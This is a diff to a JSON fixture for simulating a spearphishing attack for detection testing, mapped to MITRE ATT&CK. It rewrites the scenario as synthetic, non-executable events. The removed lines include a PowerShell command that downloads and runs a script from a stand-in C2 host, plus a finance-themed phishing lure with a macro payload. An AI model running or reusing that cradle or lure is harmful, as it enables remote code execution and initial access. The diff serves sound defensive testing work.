@@ -1,7 +1,8 @@
 {
   "id": "phishing-campaign-001",
-  "name": "Spearphishing Campaign with Payload Execution",
-  "description": "Simulation of targeted spearphishing attack leading to initial access and code execution",
+  "name": "Spearphishing Campaign Simulation",
+  "description": "Synthetic, non-executable simulation fixture for defensive detection testing.",
+  "simulated": true,
   "mitreTactics": [
     {
       "id": "TA0001",
@@ -37,53 +38,53 @@
   "steps": [
     {
       "stepNumber": 1,
-      "description": "Send spearphishing email with weaponized Office document attachment",
+      "description": "Simulate delivery of a suspicious attachment.",
       "techniqueId": "T1566.001",
       "action": {
-        "type": "access",
+        "type": "synthetic_event",
         "parameters": {
-          "target": "finance-team@target.example.com",
-          "subject": "Q4 Financial Report - Urgent Review Required",
-          "attachment": "Q4_Report_2024.docx",
-          "payload": "embedded-macro"
+          "target": "recipient@example.invalid",
+          "subject": "Synthetic security-training message",
+          "attachment": "synthetic-document.txt",
+          "payload": "none"
         },
-        "logicalOutcome": "Email delivered, attachment downloaded by 3 recipients"
+        "logicalOutcome": "Synthetic email-delivery event generated locally; no message is sent."
       },
-      "expectedResult": "Initial access vector established",
+      "expectedResult": "Detection pipeline receives a synthetic phishing indicator.",
       "timingOffset": 0,
       "simulated": true
     },
     {
       "stepNumber": 2,
-      "description": "User opens document and enables macros, triggering payload",
+      "description": "Simulate a user opening a suspicious document.",
       "techniqueId": "T1204.002",
       "action": {
-        "type": "execution",
+        "type": "synthetic_event",
         "parameters": {
-          "file": "Q4_Report_2024.docx",
-          "action": "macro-execution",
-          "payload-type": "vba-script"
+          "file": "synthetic-document.txt",
+          "action": "simulated-open",
+          "payload-type": "none"
         },
-        "logicalOutcome": "VBA macro executed, dropped secondary payload to temp directory"
+        "logicalOutcome": "Synthetic user-execution event generated locally; no file is executed."
       },
-      "expectedResult": "Code execution achieved on target workstation",
+      "expectedResult": "Detection pipeline receives a synthetic user-execution indicator.",
       "timingOffset": 3,
       "simulated": true
     },
     {
       "stepNumber": 3,
-      "description": "Execute obfuscated PowerShell script for C2 beacon establishment",
+      "description": "Simulate a PowerShell execution indicator without providing executable commands.",
       "techniqueId": "T1059.001",
       "action": {
-        "type": "execution",
+        "type": "synthetic_event",
         "parameters": {
-          "interpreter": "powershell.exe",
-          "command": "IEX (New-Object Net.WebClient).DownloadString('http://c2.example.com/beacon.ps1')",
-          "obfuscation": "base64-encoded"
+          "interpreter": "PowerShell",
+          "command": "[REDACTED-SYNTHETIC-NONEXECUTABLE]",
+          "obfuscation": "not-applicable"
         },
-        "logicalOutcome": "C2 channel established, beacon initiated every 60 seconds"
+        "logicalOutcome": "Synthetic process event generated locally; no shell is invoked and no network connection is made."
       },
-      "expectedResult": "Persistent C2 communication",
+      "expectedResult": "Detection pipeline receives a synthetic scripting indicator.",
       "timingOffset": 6,
       "simulated": true
     }
@@ -91,33 +92,21 @@
   "expectedDetectionIndicators": [
     {
       "type": "network",
-      "indicator": "Email with suspicious attachment from external domain",
+      "indicator": "Synthetic email event with suspicious attachment metadata",
       "confidence": "medium",
       "techniqueId": "T1566.001"
     },
     {
       "type": "file",
-      "indicator": "Office document with embedded macros from untrusted source",
+      "indicator": "Synthetic document opened from an untrusted-source scenario",
       "confidence": "high",
       "techniqueId": "T1204.002"
     },
     {
       "type": "process",
-      "indicator": "PowerShell execution with encoded commands",
+      "indicator": "Synthetic PowerShell execution event",
       "confidence": "high",
       "techniqueId": "T1059.001"
-    },
-    {
-      "type": "network",
-      "indicator": "Outbound HTTPS connection to suspicious domain",
-      "confidence": "high",
-      "techniqueId": "T1059.001"
-    },
-    {
-      "type": "behavioral",
-      "indicator": "Office application spawning PowerShell process",
-      "confidence": "critical",
-      "techniqueId": "T1204.002"
     }
   ],
   "impact": "medium",
